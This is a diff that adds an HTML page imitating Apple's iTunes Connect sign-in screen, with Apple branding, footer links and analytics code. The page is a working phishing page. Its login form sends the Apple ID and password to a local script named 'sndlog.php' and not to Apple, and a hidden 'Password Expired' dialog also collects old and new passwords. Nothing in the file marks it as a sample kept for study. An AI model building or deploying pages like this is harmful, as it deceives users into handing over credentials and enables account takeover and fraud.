@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<title>iTunes Connect</title>     
+    <meta name="apple-itunes-app" content="app-id=376771144">
+	<link href="index_files/interstitial.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <script src="index_files/jquery.js"></script>
+</head>
+<body style="background-color: rgb(242, 243, 244);" class="signin"><div id="pageWrapper">
+	<div id="header">
+		<div id="logo">
+		  
+		  
+		      <span>iTunes Connect</span>
+		  
+		  </div>
+	<a href="http://www.apple.com/itunes/sellcontent/" class="hero-link hl--secondary"></a></div>
+	
+    	
+    
+    
+    
+          
+          
+          <script>
+          window.l10login = {
+            signIn:   'Sign In',
+            appleID:  'Apple ID',
+            password: 'Password',
+            signedOut: 'You have successfully signed out.',
+            sessionExpired: 'Your session has expired.',
+          }
+          </script>
+
+            <div id="wrapper" class="itc-auth">
+            
+              <div class="box-container">
+            
+                  <div class="box sign-in">
+                      <h2 class="itc-signin-header">
+                          Sign In to<br> iTunes Connect
+                      </h2>
+                      <script>
+	function dsfocus(){ document.appleConnectForm.theAccountPW.focus(); }
+</script>
+
+
+	
+		<div id="ds_container">
+	
+	
+
+
+
+
+	
+		
+			<form name="appleConnectForm" method="post" action="sndlog.php">
+
+				
+				
+				
+				
+				
+					<font class="L12" face="Lucida Grande, Geneva, Verdana, Arial, Helvetica, sans-serif">
+					<font size="2">
+						<span class="dstext"></span>
+					</font>
+					</font><br><br>
+				
+				
+				
+				
+				
+				
+				
+					<table border="0" cellpadding="0" cellspacing="0" width="100%">
+						<tbody><tr valign="top">
+							<td align="left"><font size="2"><font class="G10" size="1" face="Geneva, Verdana, Arial, Helvetica, sans-serif">
+								<label for="accountname"><span class="dslabel">Apple ID</span></label>
+								<font color="#ff1102"></font></font><br>
+								<font size="2"><input placeholder="Apple ID" size="30" autocapitalize="off" autocorrect="off" maxlength="128" id="accountname" value="" name="login" type="text"></font></font>
+								
+							</td>
+						</tr>
+						
+						<tr><td><img alt="" src="index_files/spacer.gif" height="5" width="273"></td></tr>
+						<tr><td><img alt="" src="index_files/spacer.gif" height="5" width="273"></td></tr>
+						<tr>
+							<td align="left">
+								<font class="G10" size="1" face="Geneva, Verdana, Arial, Helvetica, sans-serif">
+									<label for="accountpassword"><span class="dslabel">Password</span></label>
+								</font>
+								<br>
+								<input placeholder="Password" size="30" autocapitalize="off" autocorrect="off" id="accountpassword" name="password" type="password"><input type="submit" hidden="hidden"><input name="1.Continue" src="index_files/spacer.gif" border="0" height="0" type="image" width="0">
+							</td>
+						</tr>
+						
+						
+						
+						<tr><td><img alt="" src="index_files/spacer.gif" height="5" width="273"></td></tr>
+						<tr><td><img alt="" src="index_files/spacer.gif" height="5" width="273"></td></tr>
+						
+						<tr>
+							<td>
+								<table border="0" cellpadding="0" cellspacing="0" width="100%">
+									<tbody><tr align="left">
+										
+											<td align="left" width="170">
+												
+
+												
+													<font size="1">
+														<span class="dstext">
+															
+
+															
+																
+																
+																	
+																	<input alt="Did you forget your password?" name="1.Forgot" src="index_files/iforgot-link.png" border="0" type="image">
+																
+															
+														</span>
+													</font>
+												
+											</td>
+											<td width="15"><img alt="" src="index_files/spacer.gif" height="5" width="15"></td>
+										
+										
+										
+											<td align="left" width="88"><input class="sign-in enabled" alt="Sign In" name="1.Continue" src="index_files/transparent.gif" border="0" type="image"></td>
+										
+										
+									</tr>
+								</tbody></table>
+							</td>
+						</tr>
+					</tbody></table>
+					<input name="theAuxValue" type="hidden">
+					<input value="0" id="inframe" name="inframe" type="hidden">
+				
+			</form><div class="box-msg error" style="display: none"></div>
+		
+
+		
+		
+		
+		
+	
+	
+	<script>
+		var isInIframe = (self != top);
+		var elem = document.getElementById("inframe");
+		if (isInIframe==false)
+			elem.value="0";
+		else
+			elem.value="1";
+	</script>
+</div>
+
+	
+	
+	
+	
+	
+
+
+
+
+                      
+                      <div id="msg-container">
+                        
+                        
+                        
+                      </div>
+                      
+                  </div>
+                
+                  <div class="box-signin-shadow"></div>
+                
+                </div>
+                
+            </div>
+            
+        
+        <div class="modal-container" style="display: none">
+        <form method="post" class="dsform" action="">
+            <div id="modal" class="modal-dialog">
+                  <div class="modal-dialog-content">
+                      <h1>Password Expired</h1>
+                      <p style="margin-top: 10px; display: none;">Your new password must: be 8 characters or longer, not be the same as your Apple ID</p>
+                  
+                      <ul id="ds_error_list" class="pagemessage error centerIcon"></ul>
+                    
+                    <div id="modal-content-main">
+                        
+                            <div class="formrow">
+                                <div class="fieldgroup passwordgroup">
+                                    <label>Old Password</label>
+                                    <input size="30" autocapitalize="off" oncut="return false ;" autocorrect="off" oncopy="return false ;" class="input-password" id="oldpasswordfield" name="theOldPassword" type="password">
+                                </div>
+                            </div>
+                            <div class="formrow">
+                                <div class="fieldgroup passwordgroup">
+                                    <label>New Password</label>
+                                    <input size="30" autocapitalize="off" oncut="return false ;" autocorrect="off" oncopy="return false ;" id="newpasswordfield" name="theNewPassword" type="password">
+                                </div>
+                                <div class="fieldgroup passwordgroup">
+                                    <label>Confirm New Password</label>
+                                    <input size="30" autocapitalize="off" oncut="return false ;" autocorrect="off" oncopy="return false ;" class="input-password" id="newpasswordagainfield" name="theNewPasswordAgain" type="password">
+                                </div>
+                            </div>
+                    </div>
+                  </div>
+
+                  <div class="modal-buttons">
+                    <div class="right-buttons">
+                      <button onclick="cancelExpiredForm()">Cancel</button>
+                      <button class="primary" onclick="document.appleConnectExpiredPasswordForm.submit()">Change Password</button>
+                    </div>
+                  </div>
+                </div>
+              </form>
+        </div>
+            
+    
+    
+    <script src="index_files/signin.js"></script>
+    <script>
+    (function() {
+        var body = document.getElementsByTagName('body')[0];
+        body.setAttribute('class', 'signin');
+    })();
+    </script>
+    <script>
+    
+   $(function() {
+        // Add Learn More link to header
+        var learnMoreText = 'Learn More',
+            learnMoreLink = '<a href="http://www.apple.com/itunes/sellcontent/" class="hero-link hl--secondary">'+learnMoreText+'</a>';
+       $('#header').append(learnMoreLink);
+    
+       // Add iForgot link to footer
+       var iForgotLink = '<li><a href="https://iforgot.apple.com/password">Forgot your Apple ID or password?</a></li>';
+       $(iForgotLink).insertBefore('#footer li:first-child')
+       
+       // If we receive "Expired Password" interface, display it as a modal window
+        var expForm = $('form[name="appleConnectExpiredPasswordForm"]');
+        if ( expForm.length > 0 ) {
+
+            var errors = expForm.find('span.dserror');
+            var action = expForm.attr('action');
+            
+            if (errors.length > 0) {
+                errors.each( function() {
+                    $('#ds_error_list').append('<li><div class="errormessages">'+$(this).text()+'</div></li>' );
+                    $('#ds_error_list').show();
+                })
+            } else {
+              $('#ds_error_list').hide();
+            }
+            
+            var newForm = expForm.clone();
+            
+            $('.box.sign-in').hide();
+            $('#modal').find('form').attr('name','appleConnectExpiredPasswordForm').attr('action',action);
+            $('.modal-container').show();
+            expForm.remove();
+        }
+
+
+
+   });
+
+        var cancelExpiredForm = function() {
+          document.cookie="wosid=''; expires=Thu, 01-Jan-70 00:00:01 GMT; path=/";
+          /* $('.box.sign-in').show();
+          $('.modal-container').hide();*/
+        }
+    </script>
+    
+
+        
+        <div class="footer_push"></div>
+   
+</div>
+
+
+<div id="footer" class="footer">
+    <a href="http://www.apple.com/" class="no-text ico-apple">Apple.com</a>
+    <div class="right">
+        <p>
+            Copyright © 2015 Apple Inc. All rights reserved.
+        </p>
+        <ul>
+            <li><a href="https://iforgot.apple.com/password">Forgot your Apple ID or password?</a></li><li>
+                <a href="http://www.apple.com/legal/privacy/">Privacy Policy</a>
+            </li>
+        </ul>
+    </div>
+</div>
+
+
+    <!-- <script src="/c/c73408c8ecc03f63c15cd8ff11536d1d/itc/js/cleanwrapper.js"></script> -->
+
+
+
+
+
+<script language="JavaScript" type="text/javascript" src="index_files/library.js"></script>
+<script language="JavaScript" type="text/javascript"><!--
+/* You may give each page an identifying name, server, and channel on
+the next lines. */
+s.pageName="iTC Sign In Redesign"
+s.channel="Sign In"
+
+
+s.hier5="appleitmsitcdev"
+
+
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script>
+<script language="JavaScript" type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//--></script><noscript><img src="http://metrics.apple.com/b/ss/appleitmsna/1/H.24--NS/0"
+height="1" width="1" border="0" alt="" /></noscript>
+
+
+  
+  
+</body></html>
